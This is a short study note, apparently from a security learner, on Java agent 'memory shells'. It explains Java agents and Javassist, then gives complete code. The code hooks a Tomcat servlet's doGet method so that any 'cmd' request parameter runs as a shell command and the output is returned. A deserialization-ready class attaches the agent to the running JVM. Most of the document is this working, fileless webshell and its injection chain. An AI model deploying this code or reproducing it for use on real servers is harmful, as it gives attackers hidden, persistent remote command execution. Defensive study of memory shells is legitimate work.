# Agent memshell

## Background

### Java agent

Java agent is a instrumentation technology, which allows modifying the bytecode of an unloaded java class or a loaded java class.

For retransformering a loaded java class, we need to write the java agent code and package it into a jar package. Then write a `attach` class to load the jar package and attach it to the running JVM.

### Javassist

The `Javassist` is a java class library for editing java bytecode like writing java.

## Anaysis

Firstly, we need to find a target class which can be hooked and exploited. Then write the corresponding java agent code and package it into a jar package. Upload the jar package to the attacked web server. Finally, execute the prepared `attach` class and load the jar package through deserialization vulnerability.

## Code

    public class AgentMain {
        public static final String ClassName = "com.index.IndexServlet";

        public static void agentmain(String args, Instrumentation inst) {
            inst.addTransformer(new Transformer(), true);
            Class[] loadedClasses = inst.getAllLoadedClasses();
            for (Class loadedClass : loadedClasses) {
                if(loadedClass.getName().equals(ClassName)) {
                    try {
                        inst.retransformClasses(loadedClass);
                    } catch (UnmodifiableClassException e) {
                        e.printStackTrace();
                    }
                }
            }

        }
    }

    public class Transformer implements ClassFileTransformer {
        public static final String ClassName = "com.index.IndexServlet";

        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
            className = className.replace("/", ".");
            if(className.equals(ClassName)) {
                System.out.println("Got it");
                ClassPool classPool = ClassPool.getDefault();
                ClassClassPath classPath = new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(classPath);
                try {
                    CtClass ctClass = classPool.getCtClass(className);
                    CtMethod method = ctClass.getDeclaredMethod("doGet");
                    method.insertBefore("java.lang.System.out.println(\"insert success\");\n" +
                            "if (req.getParameter(\"cmd\") != null) {\n" +
                            "   java.lang.String cmd = req.getParameter(\"cmd\");\n" +
                            "   boolean isLinux = true;\n" +
                            "   java.lang.String osType = java.lang.System.getProperty(\"os.name\");\n" +
                            "   if (osType != null && osType.toLowerCase().contains(\"win\")) {\n" +
                            "       isLinux = false;\n" +
                            "   }\n" +
                            "   java.lang.String[] cmds = isLinux ? new java.lang.String[]{\"sh\", \"-c\", cmd} : new java.lang.String[]{\"cmd.exe\", \"/c\", cmd};\n" +
                            "   java.io.InputStream in = java.lang.Runtime.getRuntime().exec(cmds).getInputStream();\n" +
                            "   java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
                            "   java.lang.String output = s.hasNext() ? s.next() : \"\";\n" +
                            "   java.io.PrintWriter out = resp.getWriter();\n" +
                            "   out.println(output);\n" +
                            "   out.flush();\n" +
                            "   out.close();\n" +
                            "}\n");
                    byte[] bytes = ctClass.toBytecode();
                    ctClass.detach();
                    return bytes;
                } catch (NotFoundException | CannotCompileException | IOException e) {
                    e.printStackTrace();
                }
            }
            return new byte[0];
        }
    }

    public class EvilAttach extends AbstractTranslet {
        static {
            final String path = "D:\\MemoryShellStudy\\EvilAgent\\target\\EvilAgent-1.0-SNAPSHOT-jar-with-dependencies.jar";
            File file = new File(System.getProperty("java.home").replace("jre", "lib") + File.separator + "tools.jar");

            try {
                URL url = file.toURI().toURL();
                System.out.println(url);
                URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
                Class<?> VirtualMachine = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
                Class<?> VirtualMachineDescriptor = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
                Method listMethod = VirtualMachine.getDeclaredMethod("list", null);
                List list = (List) listMethod.invoke(VirtualMachine, null);

                for (Object o : list) {
                    Method displayName = VirtualMachineDescriptor.getDeclaredMethod("displayName");
                    String name = (String) displayName.invoke(o, null);
                    System.out.println(name);
                    if(name.contains("org.apache.catalina.startup.Bootstrap")) {
                        Method attach = VirtualMachine.getDeclaredMethod("attach", VirtualMachineDescriptor);
                        Object vm = attach.invoke(VirtualMachine, o);
                        Method loadAgent = VirtualMachine.getDeclaredMethod("loadAgent", String.class);
                        loadAgent.invoke(vm, path);
                        System.out.println("inject success");
                        Method detach = VirtualMachine.getDeclaredMethod("detach", null);
                        detach.invoke(vm, null);
                    }
                }
            } catch (MalformedURLException | ClassNotFoundException | InvocationTargetException | NoSuchMethodException | IllegalAccessException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }
    }
